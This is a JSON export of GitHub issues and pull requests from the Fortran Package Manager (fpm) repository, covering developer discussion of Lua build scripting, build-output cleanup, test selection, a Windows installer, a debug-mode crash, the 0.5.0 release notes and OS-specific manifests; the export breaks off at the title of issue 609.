{
    "name": "fortran-lang/fpm",
    "issues": [
        {
            "number": 625,
            "user": "ivan-pi",
            "date": "2021-11-27 23:33:55+00:00",
            "title": "Automatic finalization of objects in main program scope",
            "text": "After learning about the rules on automatic finalization and deallocation in the Discourse thread (https://fortran-lang.discourse.group/t/automatic-finalization-of-derived-types/2295/15), I was wondering if refactoring the main program to use a block or subroutine would be a good idea?\nThis is not a bug report, but closer to an enhancement I suppose.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-11-29 20:59:25+00:00",
                    "text": "Seems like something easy to amend, if this is a problem. Feel free to open a pull request for proposing a patch."
                },
                {
                    "user": "rouson",
                    "date": "2021-11-30 09:12:21+00:00",
                    "text": "I think this is unnecessary and not necessarily advisable unless required to address a specific problem.   See my comments in the cited Discourse thread."
                }
            ]
        },
        {
            "number": 623,
            "user": "brocolis",
            "date": "2021-11-25 05:22:57+00:00",
            "title": "Lua scripting",
            "text": "Now that fortran-lua by @interkosmos  has support for fpm, interkosmos/fortran-lua53@8298146, fpm could expose parts of fpm_model_t to Lua script, for customization of the build process.\nFor example, I would use this feature in\n-- This is fpm.lua in the package root directory\n\nfunction OnBuild()\n   -- pseudo-lua code\n\n   if fpm.compiler.name == \"gfortran\" and fpm.compiler.version > 9 then\n      fpm.compiler.add_flags(\"-fallow-argument-mismatch\")\n   end\n\n   -- OK, continue build process\n   return true\nend\nwhere\n\nOnBuild is a predefined function to be called by fpm after fpm_model_t is built, and before the actual build starts.\nfpm.compiler.name and fpm.compiler.version are read-only properties\nfpm.compiler.add_flags is a function called from Lua into fpm. Fpm can accept or reject writes to the model.\nreturn true - tells fpm everything is alright. return false to stop the build process.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2021-11-28 00:29:41+00:00",
                    "text": "I was thinking about something similar lately while reflecting upon #611. The TOML spec supports multi-line strings (see https://toml.io/en/v1.0.0#string), meaning that you could in principle include a script directly in the manifest.\nInstead of Lua, I was thinking of a pseudo-Fortran language, a variation of the \"simple programming language\" (spl) introduced in the book Fortran Tools for VAX/VMS and MS-DOS. The authors of that book wrote a compiler/interpreter for their pseudo-Fortran language in Fortran. Programs are executed by a language virtual machine (again written in Fortran).\nThe main difference of spl to Fortran is the language has reserved keywords (simplifies parsing), and only a subset of types is supported including real, integer, logical, and character (there is no \"kind\" specifier). There are a few other quirks on how I/O and strings are handled.\nI started working my way through the online book Crafting Interpreters to hopefully build the skill set needed to pursue such a project, but there's still a long journey ahead.\nGiven the maturity of Lua, and the fact it can be built/installed on any platform with a C compiler, fpm + Lua form a good combination. The biggest disadvantage I see for now is that not many Fortran programmers are familiar with Lua."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-11-28 00:53:05+00:00",
                    "text": "This is kind of a fundamental question in the design of fpm, whether we want allow a turing complete language as a build script / package manifest (CMake, scons, waf, xmake, ...) or whether we want to restrict ourselves by using a limited DSL (meson) or a configuration language (cargo, stack). Turns out in practice even tools like cargo have a way to circumvent the self-imposed limitations of the package manifest language, either by adding logical selectors as keys or loading a build script written in a turing complete language.\nI personally like the way meson is going by offering a non-turing complete language for the build files, this reduces the complexity that you might have to deal with as user significantly, however you don't need a turing complete language to pull big stunts in your build files ;). Still, having guardrails that stop you from getting carried away helps a lot.\nWe are seeing this issue with fpm now, TOML alone is just too limited to express the complexity of some Fortran builds. I personally think that a build script in some other programming language (Fortran, Lua, Python, ...) is not the right step to take. However, adding some simple logical selectors in our package manifest to deal with different operating systems and compilers might be desirable, for this purpose we could use a Fortran-like expression parser to evaluate some logical conditions."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-11-28 01:37:52+00:00",
                    "text": "In principle with Lua, you could have the scripts run in a sandbox, e.g. https://stackoverflow.com/questions/1224708/how-can-i-create-a-secure-lua-sandbox\nIf I understand correctly when you load a function you can control the environment the function runs in, restricting access to language features which are potentially unsafe.\nBut I see now this is a bigger design decision. I don't know enough about meson to say what are the advantages of the non-scriptable approach. What I do see with the scriptable build tools (CMake, scons, waf, xmake) is they quickly become a mess to deal with.\nIt would be good to understand what are the use cases where the manifest is too restricting. You've mentioned two, platform- and compiler-specific settings, optional library dependencies and preprocessors are two more areas."
                },
                {
                    "user": "zoziha",
                    "date": "2021-11-28 02:34:30+00:00",
                    "text": "It seems that there is a cargo-make (a cargo plug-in) here, which can make some conditions for judging, maybe we can refer to:\nhttps://github.com/sagiegurari/cargo-make#conditions\n\ncargo-make: Rust task runner and build tool.\n\n[tasks.test-condition]\ncondition = { platforms = [\"windows\", \"linux\"], channels = [\"beta\", \"nightly\"] }\nscript = '''\necho \"condition was met\"\n'''\nAlthough it looks a bit cumbersome."
                },
                {
                    "user": "brocolis",
                    "date": "2021-11-28 04:24:35+00:00",
                    "text": "OK. I understand your concerns and I agree this is an important design decision. I chose Lua because the language is simple, mature and designed to be embedded in other programs; we can easily remove parts of Lua standard library we don't need. Regarding the alternatives, I'm not familiar with SPL or DSL, and can't say if they are good or not. If they are good, it is OK for me. Anyway I am trying fpm with Lua and I think it is very nice. Here's a quick demo.\n\n  \n    \n    \n\n    fpm-lua.mp4\n    \n  \n\n  \n\n  \n\n\nAnd this fpm.lua\nprint(\"Hi guys, I'm a lua script ...\")\n\nprint(\"fpm.version: \",   fpm.version)\nprint(\"fpm.fc: \",        fpm.fc)\nprint(\"fpm.fcversion: \", fpm.fcversion)\nprint(\"fpm.fflags: \",    fpm.fflags)\n\nif fpm.fc == \"gfortran\" then\n    if string.find(fpm.fflags, \"-Wall\") then\n        print(\"-Wall enabled!\")\n    end\nelseif fpm.fc == \"lfortran\" then\n    print(\"Good choice\")    \nend\n\nif math.pi > 3.14 then\n    print(math.pi)\nelse\n    -- lol\nend\n\nprint(\"-----------------------------\")"
                }
            ]
        },
        {
            "number": 622,
            "user": "LKedward",
            "date": "2021-11-23 10:36:10+00:00",
            "title": "Cleanup the backend output",
            "text": "Hide compiler output if not --verbose\n Show build progress as percentage\n Redirect compiler output to file\n Dump compiler output on error\n Cleanup 'plain' output (for non tty)\n Add comments to new modules\n Print compiler output for all built targets when --verbose\n Describe changes for reviewers\n Test on different environments\n\nFeel free to test it out - feedback welcome.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-11-27 19:01:58+00:00",
                    "text": "I've now implemented everything I'd envisaged for this. Apologies for the size of the PR! Handling the isatty check and collecting compiler output made it a bit more involved.\nIn summary:\n\nCompiler output is now redirected to log files by default and not printed to the screen\n'Pretty' status messages are printed and an overall progress percentage\nIf the --verbose flag is passed, then pretty printing is disabled and the compiler output is printed to screen (including already-built targets during incremental builds)\nIf stdout is not connected to a terminal, then pretty printing is disabled\n\nThis PR bundles a small MIT licensed c code for properly checking isatty on Windows.\nI also had to update the bootstrap version in the CI and the gfortran version in the Windows runner.\nI've tested on Ubuntu, Windows command prompt and MSYS2 (Mintty) on Windows. Will need a volunteer to test on Mac."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-28 18:10:36+00:00",
                    "text": "Everything has tested well.  I was going to suggest using the attr_update(3f) function in M_attr(3f) to add clearline, upline, and downline and moving the call to detect if plain or color mode to the fpm_command_line module so all routines could use colors, so the messages set up with  and  could use color but it looks like you took M_attr out.\nAs far as the interface goes, I would prefer that --verbose show all messages only when all targets are built, and only show messages from rebuilt files during an incremental build.  On a large project a rebuild of a single file with --verbose mode shows 27 000, lines, which is actually more verbose than the original :>.\nThe conditional --verbose mode output is of course not an issue with a project composed of one file, and really only gets horrible with the gfortran compiler and allocatable strings but to me that is a must-have.\nStill reviewing, and I think some other thoughts I have had (discussed in the previous canceled PRs) are not important enough to hold back this (IMO) major advancement  (having messages in the associated log files). Some utilties use repeated use of --verbose or a --verbose level  like --verbose [1,2,3...].  That would be easy to add transparently at the command line level."
                },
                {
                    "user": "certik",
                    "date": "2021-11-28 18:30:43+00:00",
                    "text": "I tested on Apple M1. I rebuilt this PR, and then tried to run, it works, but \"build\" segfaults:\n$ build/gfortran_2A42023B310FA28D/app/fpm \nFortran Package Manager:\n \nUSAGE: fpm [ SUBCOMMAND [SUBCOMMAND_OPTIONS] ]|[--list|--help|--version]\n       where SUBCOMMAND is commonly new|build|run|test\n\n subcommand may be one of\n\n  build     Compile the package placing results in the \"build\" directory\n  help      Display help\n  list      Display this list of subcommand descriptions\n  new       Create a new Fortran package directory with sample files\n  run       Run the local package application programs\n  test      Run the test programs\n  update    Update and manage project dependencies\n  install   Install project\n\n Enter \"fpm --list\" for a brief list of subcommand options. Enter\n \"fpm --help\" or \"fpm SUBCOMMAND --help\" for detailed descriptions.\n\n\n\n$ build/gfortran_2A42023B310FA28D/app/fpm build\n\nProgram received signal SIGSEGV: Segmentation fault - invalid memory reference.\n\nBacktrace for this error:\n#0  0x104bd76f7\n#1  0x104bd671b\n#2  0x18dfc6c43\n#3  0x1048c2ac7\nzsh: segmentation fault  build/gfortran_2A42023B310FA28D/app/fpm build"
                },
                {
                    "user": "certik",
                    "date": "2021-11-28 18:32:12+00:00",
                    "text": "In lldb I get:\n* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0xc)\n    frame #0: 0x000000010004300c fpm`__fpm_filesystem_MOD_mkdir at fpm_filesystem.F90:360:23\n   357 \t    logical :: echo_local\n   358 \t    \n   359 \t    if(present(echo))then\n-> 360 \t        echo_local=echo\n   361 \t     else\n   362 \t        echo_local=.true.\n   363 \t     end if\nTarget 0: (fpm) stopped.\n(lldb) bt\n* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0xc)\n  * frame #0: 0x000000010004300c fpm`__fpm_filesystem_MOD_mkdir at fpm_filesystem.F90:360:23\n    frame #1: 0x0000000100022ac8 fpm`__fpm_backend_MOD_build_package at fpm_backend.f90:68:34\n    frame #2: 0x000000010000da30 fpm`__fpm_MOD_cmd_build at fpm.f90:290:62\n    frame #3: 0x0000000100005180 fpm`MAIN__ at main.f90:67:28\n    frame #4: 0x000000010000565c fpm`main at main.f90:10:28\n    frame #5: 0x000000018df99430 libdyld.dylib`start + 4"
                },
                {
                    "user": "LKedward",
                    "date": "2021-11-28 19:16:07+00:00",
                    "text": "Thanks for testing @urbanjost and for the feedback. Good point about --verbose, I think I'll change it back to only print output for those files that get built. Yes, I started using M_attr but I didn't find clearline or lineup or linedown in it (sorry I probably didn't read the documentation clearly!) and ended simplifying without it. Good point about being able to use color in other parts of fpm. Perhaps you could incorporate it in a future PR after this one?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-11-28 19:19:14+00:00",
                    "text": "Thanks for testing @certik - could you try a clean build by first removing the build directory? (Sorry if you've already tried this). The backtrace is indicating a call from fpm_backend.f90 but this was renamed to fpm_backend.F90."
                },
                {
                    "user": "certik",
                    "date": "2021-11-28 19:28:38+00:00",
                    "text": "That was it! This is a real bug in fpm, as it needs to be able to pick this up. But unrelated to this PR. Everything works now. And it works great, looks beautiful. Thank you for implementing this.\nWith --verbose it prints both the commands and their output. I would recommend to have a mode that does not print commands, but prints output, like the default \"cmake && make\" does. That way you can still see warnings and can easily see if things build \"cleanly\" or not.\nI tested that if there is an error, the error message is correctly printed."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-28 19:36:05+00:00",
                    "text": "With some reservation, M_attr was initially limited to just color intentionally, but you can add any string you want via the attr_update so you would have to define a string like \"up\" or \"down\".  I did a color add PR before, I can redo it or part of\nit. That is partly why the string prefixes for a lot of the messages start with \"\" and \"\".\nI liked the ability to get all the messages too, and although not perfect I think showing them all when all targets are built would still be a good idea. There are several things getting all the messages as-built are appealing about, just not when I am working on one little routine! I also like that they are in the files so something like a plugin could let you review them on a per-file basis and compare output from various compilers and such so it would be nice to keep that capability.\nI was thinking about re-introducing at least part of the PR for color after something like this was in place, as there was potentially a lot of collision. Once this is in place I have no problem with that, accept I need to call your isatty at the top. M_attr just shows using the extensions, having a more general ISATTY in fpm is nice; I am thinking I need to add that to M_attr."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-28 19:47:22+00:00",
                    "text": "PS;  I think ifort and gfortran always default to PAD='yes' but not sure, so might want to add that explicitly or getline(3f) will probably have a problem, as per the example in getline."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-30 14:27:04+00:00",
                    "text": "somewhat ironically, I immediately miss being able to get all the messages on a built project. Is that something you were going to build back in?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-11-30 16:16:19+00:00",
                    "text": "somewhat ironically, I immediately miss being able to get all the messages on a built project. Is that something you were going to build back in?\n\nI agree we should build this in but I'm not sure what the user interface would be right now (fpm log, fpm build --log?) and so I suggest leaving this for a future PR."
                }
            ]
        },
        {
            "number": 621,
            "user": "HaoZeke",
            "date": "2021-11-22 21:15:44+00:00",
            "title": "Skip slow tests",
            "text": "Description\npytest has decorators which allow for a variety of conditional executions. It would be useful to have a way of marking slow tests, or other kinds of conditional test runs.\nPossible Solution\nTechnically each test can check environment variables (as noted by @certik), but it would be nicer to have this at the test runner level.\nAdditional Information\nN/A.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2021-11-23 00:19:26+00:00",
                    "text": "The use case we have is generating data for plots into an article. Some of the convergence studies might take a longer time (say several minutes) and we would like the default \"fpm test\" to finish in a few seconds. One approach is to have \"slow tests\" that are not executed by default. We can then internally run the full convergence study in the slow test, and a faster version of the same study in the fast test (to ensure that the study works)."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-23 02:51:11+00:00",
                    "text": "I tend to break my tests into a confidence test that is very quick but exercises a few key features, a collection of short tests that do coverage, and what I usually call benchmark tests that are long-running. When I have moved those to fpm I have been breaking them up by name with the globbing feature like \"run test 'bench_', run test 'general_' and run test confidence; and in one case I made the test program a program that takes parameters that select which directory to run and put the other test programs into directories and did not find any of those quite hit the mark, so I think I will take  a look at how pytest does it. Any other examples of models to try?  I was thinking about lists of tests or directories that you could give a name to in the fpm.toml file, and then do something like \"run test -type plot\" or \"run test -type benchmark\", and earlier I had a PR that allowed for a \"y/n\" reply to a prompt that no one else seemed to like so I didn't pursue it."
                }
            ]
        },
        {
            "number": 619,
            "user": "certik",
            "date": "2021-11-21 17:22:44+00:00",
            "title": "Change how output is presented",
            "text": "Currently fpm's output is very verbose and it's hard to see what is going on. A bunch of commands (typically compiler invocations) are printed to stdout. Instead, let's do something like Rust's Cargo does:\n$ cargo build\n   Compiling libc v0.2.103\n   Compiling autocfg v1.0.1\n   Compiling proc-macro2 v1.0.26\n   Compiling unicode-xid v0.2.2\n   Compiling syn v1.0.72\n   Compiling pkg-config v0.3.19\n   Compiling cfg-if v1.0.0\n   Compiling serde_derive v1.0.130\n...\n   Compiling path_abs v0.5.1\n   Compiling encoding v0.2.33\n   Building [============>             ] 79/150: encoding, proc-macro-hack...\n\nOr the Julia's Pkg:\njulia> import Pkg\n\njulia> Pkg.add(\"SymEngine\")\n   Resolving package versions...\n   Installed RecipesBase \u2500\u2500\u2500 v1.1.2\n   Installed MPC_jll \u2500\u2500\u2500\u2500\u2500\u2500\u2500 v1.2.1+0\n   Installed SymEngine_jll \u2500 v0.6.0+1\n   Installed SymEngine \u2500\u2500\u2500\u2500\u2500 v0.8.6\n  Downloaded artifact: SymEngine\n  Downloaded artifact: MPC\n    Updating `~/.julia/environments/v1.6/Project.toml`\n  [123dc426] + SymEngine v0.8.6\n    Updating `~/.julia/environments/v1.6/Manifest.toml`\n  [3cdcf5f2] + RecipesBase v1.1.2\n  [123dc426] + SymEngine v0.8.6\n  [2ce0c516] + MPC_jll v1.2.1+0\n  [3428059b] + SymEngine_jll v0.6.0+1\n  [781609d7] + GMP_jll\n  [3a97d323] + MPFR_jll\nPrecompiling project...\n  6 dependencies successfully precompiled in 4 seconds (48 already precompiled)\n\nNote that Julia's Pkg prints all kinds of nice progress markers that all disappear when it is done, so the above output only captures the final result. I recommend you try the above commands yourself to see what I mean.\nThe final output of Cargo seems cleaner and it seems it contains all the information you need to know, which is which package got built and which version. We can also print which Fortran compiler was used (I am not sure).\nP.S I thought I already opened up an issue for exactly this, but I can't find it, so I opened a new one.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-11-21 19:12:38+00:00",
                    "text": "I made an attempt at this a while back (see this post) but didn't get a chance to finish it off and the code was a little hectic. You can see the changes here. I might have some time to clean it up for a PR next weekend."
                },
                {
                    "user": "certik",
                    "date": "2021-11-21 20:21:06+00:00",
                    "text": "Perfect! That's exactly what we need. If you had time to finish it that'd be great. The code looks minimal.\nA change like this I expect will require all kinds of testing and tweaking to ensure it works on all platforms (Windows) and that you can turn it off to redirect the output to a file, and so on. But I would recommend to simply get it merged into master, and then we'll fix all bugs as we go."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-21 23:22:49+00:00",
                    "text": "Since a lot of the messages are still set up for it from previous runs at this (#502 and #505 in particular) note that a lot of the messages are set up with  and  prefixes (and others) to be used with M_attr, which is a small module that was designed to just be included into fpm(1) to allow for color mode, and that a (probably) simple one that should probably done first is to add the verbose mode into the  backend model, as there were concerns about it just being provided as a global state type.  M_attr was designed to add color in a manner that can be turned of except when writing to a tty device and to allow for extensions and customization without changing the code, but as a simplified version of M_escape that could just be added as file in the fpm distribution, although I suppose there is nothing wrong with using it as a dependency. The model that made most sense to me was that the command output for each command is written to a file in build and then copied back only if verbose mode is on or if an error occurs by default;  but can be examined with new options at any time after the build without rebuilding.\nThat seemed like an excellent model, providing logging and controlling verbosity at the same time, and allowing for options like not showing messages from dependencies, showing messages with a specific string and so on that can probably be prototyped with a plug-in  (but a dumb at TOML or NAMELIST of the machine info to the plugins would allow them to be far more powerful, which does not exist yet). One of the advantages of adding color with M_attr is the log files can still contain the strings like  and so easily re-displayed with and without color.  If/when the last PR I put in was accepted adding a verbose state was on my list but others can probably add that very quickly in less time, as what held me back was wanting to re-familiarize myself with the backend  as it has changed a lot since I last was altering it.\nM_attr\nYou can see how it was used in the quiet mode, as well as with help text in the referenced PRs and issues from the last two times; and the github repository explains some of the reasons to use this approach for color rather than directly using the escape sequences."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-21 23:38:51+00:00",
                    "text": "PS;  although their is an ncurses library for WIndow, i was playing with a plugin that used ncurses that displayed the source files like the output in a tree(1) output like at the beginning of the video from @LKedward ward  where the file names changed color as they were done and you could click on them to see their messages or edit them (via the environment variable EDITOR) that was promising, but without a nice interface from the plugin to the backend it was way too kludgy but at some point (maybe using an entirely different GUI tool) maybe a mini-IDE would be nice; but my general impression was that those so inclined to use an IDE already were using a full-blown one and just wanted interfaces into their favorite one.  I would probably restart if I try that again, but you can get an idea of how it worked by looking at fixedform in  M_ncurses"
                },
                {
                    "user": "certik",
                    "date": "2021-11-22 02:51:08+00:00",
                    "text": "@urbanjost if you are interested, we created this library: https://github.com/jupyter-xeus/cpp-terminal/ which implements ncurses like functionality and it works on Windows. It also implements a multiline editing \"widget\" (that works on all platforms), that LFortran uses."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-23 02:33:43+00:00",
                    "text": "Thanks. I will give that a try. What I was picturing was a scroll-able window that looks like the output of the tree(1) command that would be colored according to whether built with no warnings, with warnings, or with errors and you could click on the names to edit, see the build log of the routine, or run if an executable, sort of like a graphical windows commander plugin; but just have not had the time to pursue it."
                }
            ]
        },
        {
            "number": 616,
            "user": "LKedward",
            "date": "2021-11-21 10:21:45+00:00",
            "title": "Add: workflow to make installer on push and release",
            "text": "Adds an extra job in CI workflow to generate a Windows installer fpm-installer-<version>.exe\nThe installer packages fpm and Git for Windows which are installed locally and added to the user PATH variable\n\nI've tested the new workflow here which produces this release.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-11-21 15:12:18+00:00",
                    "text": "Cool, the installer is also automatically included in the continuous delivery."
                }
            ]
        },
        {
            "number": 615,
            "user": "brocolis",
            "date": "2021-11-21 02:41:53+00:00",
            "title": "Trouble with `--show-model`",
            "text": "Description\nFound this while I was trying to debug an unrelated issue in fpm itself.\ncd fpm\nfpm build --show-model\nAt line 247 of file ././src/fpm_model.f90\nFortran runtime error: Index '1' of dimension 1 of array 'source%link_libraries' below lower bound of 4\n\nError termination. Backtrace:\n#0  0x7f0a0e0f9332 in ???\n#1  0x7f0a0e0f9df9 in ???\n#2  0x7f0a0e0fa40a in ???\n#3  0x4ad86b in info_srcfile\n        at ././src/fpm_model.f90:247\n#4  0x4af2fa in info_package\n        at ././src/fpm_model.f90:167\n#5  0x4a363c in info_model\n        at ././src/fpm_model.f90:277\n#6  0x4a2db9 in __fpm_model_MOD_show_model\n        at ././src/fpm_model.f90:313\n#7  0x40c527 in __fpm_MOD_cmd_build\n        at ././src/fpm.f90:285\n#8  0x4027eb in MAIN__\n        at app/main.f90:67\n#9  0x402d1b in main\n        at app/main.f90:10\n\nExpected Behaviour\nView fpm model.\nVersion of fpm\n9dc068d\nPlatform and Architecture\nLinux x64, Windows x64\nAdditional Information\nNo response",
            "comments": [
                {
                    "user": "brocolis",
                    "date": "2021-11-21 02:52:50+00:00",
                    "text": "fpm.exe from @awvwgk test release https://github.com/awvwgk/fortran-package-manager/releases/download/v0.5.0/fpm-0.5.0-windows-x86_64.exe works with --show-model"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-11-21 03:05:12+00:00",
                    "text": "I believe this occurs only in debug mode. I can reproduce the issue on Linux+debug build, and no problem on Linux+release build. I don't understand yet from looking at the code why it happens."
                }
            ]
        },
        {
            "number": 614,
            "user": "awvwgk",
            "date": "2021-11-20 20:39:48+00:00",
            "title": "Bump version to 0.5.0",
            "text": "Test release at https://github.com/awvwgk/fortran-package-manager/releases/tag/v0.5.0\nTentative release notes:\nAlpha release update for the Fortran package manager (fpm).\n\n**Changes**\n\n- tests are only build for fpm test and not by default anymore (https://github.com/fortran-lang/fpm/pull/572)\n\n- environment variables for setting Fortran and C compiler changed (https://github.com/fortran-lang/fpm/pull/549, https://github.com/fortran-lang/fpm/pull/584)\n\n- add LFortran optimization flag to release profile (https://github.com/fortran-lang/fpm/pull/597) \n\n\n**New features**\n\n- command line arguments for linker, archiver and C-compiler added (https://github.com/fortran-lang/fpm/pull/549)\n\n\n**Fixes**\n\n- tabs are correctly expanded in source file scanning (https://github.com/fortran-lang/fpm/pull/521)\n\n- installer script will use fpm update to avoid stale dependencies (https://github.com/fortran-lang/fpm/pull/557)\n\n- use multiple build output directories depending on link line options (https://github.com/fortran-lang/fpm/pull/575)\n\n- update truncated help text (https://github.com/fortran-lang/fpm/pull/578)\n\n- fix directory removal in fpm new tests (https://github.com/fortran-lang/fpm/pull/579)\n\n- use MSVS like commands for Intel compilers on Windows (https://github.com/fortran-lang/fpm/pull/590)\n\n- add critical section to mkdir in backend (https://github.com/fortran-lang/fpm/pull/613)\n\n- fix modules listing (for install) (https://github.com/fortran-lang/fpm/pull/612)\n\n- repair --list option and correct obsolete descriptions of the --list option (https://github.com/fortran-lang/fpm/pull/607)\n\n- fix incorrect Intel release flag on Windows (https://github.com/fortran-lang/fpm/pull/602)\n\n- list names without suffix for Windows (https://github.com/fortran-lang/fpm/pull/595)\n\n\n**Repository updates**\n\n- add files and workflow to make installer on release (https://github.com/fortran-lang/fpm/pull/616)\n\n- issue templates added to guide reporting of bugs, package issues, feature requests and specification proposals (https://github.com/fortran-lang/fpm/pull/558)\n\n- default branch renamed to *main* (https://github.com/fortran-lang/fpm/pull/565)\n\n- update documentation on distributions supporting fpm, like spack and MSYS2 (https://github.com/fortran-lang/fpm/pull/562)\n\n- new workflow to automatically generate single source fpm versions (https://github.com/fortran-lang/fpm/pull/563)\n\n- continuous delivery of current fpm git source implemented (https://github.com/fortran-lang/fpm/pull/564, https://github.com/fortran-lang/fpm/pull/569)\n\n- update of bootstrapping instructions (https://github.com/fortran-lang/fpm/pull/587)\n\n- update README.md compiler, archiver, & link flags (https://github.com/fortran-lang/fpm/pull/598)",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-11-21 15:33:11+00:00",
                    "text": "Alright, I'll go ahead and make the release."
                }
            ]
        },
        {
            "number": 613,
            "user": "LKedward",
            "date": "2021-11-20 15:24:56+00:00",
            "title": "Add: critical section to mkdir in backend",
            "text": "Minor fix to get parallel builds working on Windows where mkdir fails if the directory already exists.",
            "comments": []
        },
        {
            "number": 612,
            "user": "LKedward",
            "date": "2021-11-20 15:22:01+00:00",
            "title": "Fix modules listing (for install)",
            "text": "Quick fix so that setup-stdlib from quickstart-fortran works with the latest fpm.\n\nRemove spurious \"fpm\" from the module path\nSkip submodules when collecting modules for install",
            "comments": []
        },
        {
            "number": 611,
            "user": "rouson",
            "date": "2021-11-17 21:28:30+00:00",
            "title": "Command line argument to specify manifest location",
            "text": "Description\nI'm building a project that depends on GASNet-EX, which links to different libraries on different operating systems (macOS vs Linux).  We will need different OS-specific fpm.toml files.\nPossible Solution\nIt would be helpful to have a fpm argument that specifies which manifest to use, e.g.,\nfpm build --manifest macOS-fpm.toml\n\nAdditional Information\nNo response",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-11-17 21:38:59+00:00",
                    "text": "Would it be an option to have operating system dependent link options in the same manifest? I would prefer to keep a single, somewhat more complex manifest rather than having several package manifest files, since those will cause issues for dependencies.\nMaybe something like the selector below would be straight-forward to support in fpm:\n[build]\nlink.osx = [\"...\"]\nlink.linux = [\"...\"]\nAlternatively, there might be an option to use, which could provide a more general and extensible selector syntax\n[build]\nlink = [\n  {if=\"os is osx\", then=\"...\"},\n]\nHowever we will need to invent our own grammar or borrow an existing one and create an expression parser."
                },
                {
                    "user": "jvdp1",
                    "date": "2021-11-17 21:45:56+00:00",
                    "text": "Actually this might be also useful for supporting multiple compilers. E.g.,\nI am currently trying fpm with 2 different compilers to build a same\nproject. However, the libraries used by each compiler have slightly\ndifferent names (e.g., \"gomp\" vs \"iomp\"). Therefore, if I want to use\nanother compiler than the default one, I must first change the `link`\noption in fpm.toml (I didn't find a way to do that yet).\n\nLe mer. 17 nov. 2021 \u00e0 22:39, Sebastian Ehlert ***@***.***> a\n\u00e9crit :\n\u2026\n Would it be an option to have operating system dependent link options in\n the same manifest? I would prefer to keep a single, somewhat more complex\n manifest rather than having several package manifest files, since those\n will cause issues for dependencies.\n\n Maybe something like the selector below would be straight-forward to\n support in fpm:\n\n [build]link.osx = [\"...\"]link.linux = [\"...\"]\n\n Alternatively, there might be an option to use, which could provide a more\n general and extensible selector syntax\n\n [build]link = [\n   {if=\"os is osx\", then=\"...\"},\n ]\n\n However we will need to invent our own grammar or borrow an existing one\n and create an expression parser.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#611 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AD5RO7HX2GTWGUXE5MJH32DUMQOH5ANCNFSM5IIBAD6Q>\n .\n Triage notifications on the go with GitHub Mobile for iOS\n <https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&mt=8&pt=524675>\n or Android\n <https://play.google.com/store/apps/details?id=com.github.android&referrer=utm_campaign%3Dnotification-email%26utm_medium%3Demail%26utm_source%3Dgithub>."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-18 09:37:16+00:00",
                    "text": "I am also finding the lack of conditional expressions in a TOML file frustrating, but having profiles supported with definitions in the fpm.toml would satisfy most of my needs.\nIf there were a standard pre-processor another solution might be that the fpm.toml file could be run through the pre-processor passing in the current OS and compiler and profile. Not the most elegant solution but it not require any additional coding if something like cpp(1) directives were supported.\nIs there any other program using TOML files that has added conditional processing other than via selecting named sections?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-11-18 19:30:23+00:00",
                    "text": "Couldn't fpm have a built-in expression parser to evaluate some type of Fortran-inspired conditional statements? Something like:\nlink = [ 'merge(\"iomp\",\"gomp\",compiler == id_intel)' ]\n\nThe first suggestion from @awvwgk looks like the simplest to me. On the other hand the combinatorial explosion of platforms, compilers, and various library name exceptions, makes me worried it could get complicated, and a solution at a higher abstraction level is needed.\nAn orthogonal suggestion would be to have the main fpm.toml which includes the default options, and secondary platform specific toml files, which get loaded after the primary toml, overwriting any values. (Doesn't CMake use an approach like this?)"
                },
                {
                    "user": "rouson",
                    "date": "2021-11-19 04:27:46+00:00",
                    "text": "I'm fine with any solution that solves the problem.  I suspect that the one I originally proposed is probably the easiest for fpm to support, albeit by offloading to the user the work of maintaining multiple manifests.  I'm a minimalist so I use default directory locations, my projects only have a few dependencies, and my manifests are generally 5-10 lines.  Maintaining multiple ones is no problem.\nOf the other solutions proposed, I think the conditional logic seems like the most work to implement in fpm, whereas the preprocessor approach adds a third-party tool and I think one of the most beautiful things about  fpm is that it has no dependencies other than a Fortran compiler and it can be installed by compiling a single file.  I recommend keeping that level of simplicity as long as you possibly can.  When trying to introduce fpm in a project that was using another build system, the simplicity with which fpm can be installed and used is a major plus."
                },
                {
                    "user": "rouson",
                    "date": "2021-11-21 01:23:08+00:00",
                    "text": "Another alternative would be an option to specify the manifest's location.  For now, I will have the project's install.sh script create an OS-specific manifest in the build tree and then create a soft-link to that manifest at the top level of the source tree.  If something like a --manifest-path existed, we wouldn't need the soft-link, which would eliminate the chance that someone might unnecessarily commit the link.  For now, I'll add fpm.toml to the .gitignore file, but that feels a little strange and might cause some headache someday if we're able to write a single manifest for all platforms and a future developer can't figure out why they can't commit the new manifest.  I'm likely to be that forgetful future developer. :)"
                }
            ]
        },
        {
            "number": 609,
            "user": "awvwgk",
            "date": "2021-11-14 11:24:39+00:00",
            "title": "Allow optional features in projects",
